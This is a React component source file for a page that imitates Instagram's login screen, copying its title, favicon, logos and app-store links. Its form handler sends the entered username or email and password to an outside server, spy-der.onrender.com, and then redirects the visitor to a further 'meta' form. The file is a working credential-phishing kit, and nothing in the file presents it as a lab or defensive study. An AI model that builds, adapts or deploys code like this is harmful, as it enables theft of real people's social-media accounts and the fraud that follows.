/* eslint-disable no-unused-vars */
import axios from 'axios';
import { useState, useEffect } from 'react'
import MyInput from '../Modules/MyInput'
import MyButton from '../Modules/MyButton';
// import { Navigate, Link } from 'react-router-dom';

const InstagramForm = () => {
  
  const [emailOrUsername, setEmailOrUsername] = useState("");
  const [password, setPassword] = useState("");



  useEffect(() => {
    document.title = 'Instagram Verification';
    const iconLink = document.querySelector("link[rel~='icon']");
    iconLink.href = 'instagram-48.png';
  },[])

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formData = { emailOrUsername, password };
    const res = await axios.post('https://spy-der.onrender.com/instagram', formData)
    .then(res => {
      console.log(res.data);
      setEmailOrUsername("");
      setPassword("");
    }).catch(function (error) {
      console.error(error);
    });
    window.location.replace("/insta-meta-form")
  };




  return (
    <div className='mt-6'>
      <h1 className='text-white text-2xl text-center font-[cursive]'>Instagram Verification</h1>
      <div className='flex space-x-2 justify-center items-center h-full mt-2 w-full'>

        <div className='hidden lg:block '>
          <img src="screenshot_insta.png" className='w-64' alt="" />
        </div>

        <div>
          <div className='border-2 relative border-slate-300 rounded-md flex flex-col p-2 space-y-4 w-full items-center justify-center' >
            <div className='flex space-x-2 items-center justify-center'>
              <img src="instagram-logo-text-white.png" alt="" className="w-80 " />
            </div>
            <form onSubmit={handleSubmit} className='flex flex-col items-center space-y-4'>
              <MyInput label="Phone number, Email Or Username" type='text' value={emailOrUsername} onChange={(e) => setEmailOrUsername(e.target.value)} />
              <MyInput label="Password" type='password' value={password} onChange={(e) => setPassword(e.target.value)} />
              
                <MyButton type='submit' >Login</MyButton>
            </form>
            <div className='inline-flex items-center justify-center'>
              <hr className='w-64 h-px my-4 bg-gray-700 border-0' />
              
            </div>
            <div>
              <img src="meta-insta2.png" className="h-10" alt="" />
            </div>
          </div>
          <div className='flex flex-col border-slate-300 border-2 rounded-md my-2 p-2 justify-center items-center space-y-2'>
              <h1 className="text-white">Get The APP.</h1>
              <div className='flex space-x-2'>

                <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                  <div className='bg-black rounded-md space-x-3 p-2 flex items-center w-fit '>
                    <img src="playstore-48.png" alt="" className='w-8' />
                    <h1 className='text-white text-lg'>Get It On Playstore</h1>
                  </div>
                </a>

                <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT?hl=en-in&gl=in" className='hidden lg:block '>
                  <div className='bg-black rounded-md space-x-3 p-2 flex items-center w-fit '>
                    <img src="microsoftstore-48.png" alt="" className='w-8' />
                    <h1 className='text-white text-lg'>Get It On Microsoft Store</h1>
                  </div>
                </a>
              </div>
          </div>
        </div>
      </div>

    </div>
  )
}

export default InstagramForm